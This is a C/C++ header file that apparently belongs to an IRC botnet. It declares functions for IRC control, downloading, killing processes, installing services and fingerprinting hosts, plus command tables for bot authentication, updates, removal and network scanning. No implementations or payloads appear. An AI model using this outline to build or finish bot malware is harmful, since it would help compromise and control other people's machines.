extern bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen);
extern int FpHost(const char *szHost, int iFpType);
extern void Download();
extern int TerminateProc(const char *szToTerminate);
extern char *SystemUptime();
extern CRITICAL_SECTION CriticalSection;
extern void *RunIRC(void);
extern string OSVersion(void);
extern string UPVersion(void);
extern string USVersion(void);
extern void InstallSvc(const char *szSvcName,char *szFilePath);
extern void UninstallSvc(const char *szSvcName);
extern void StartSvc(char *szSvcName);
extern void InitSvc();

/* Command List */
extern string bot_auth[];
extern string bot_main[];
extern string bot_scan[];

extern string main_disc[];
extern string main_rec[];
extern string main_up[];
extern string main_dl[];
extern string main_msa[];
extern string main_mso[];
extern string main_rm[];

extern string scan_sta[];
extern string scan_sto[];
extern string scan_cip[];
extern string scan_st[];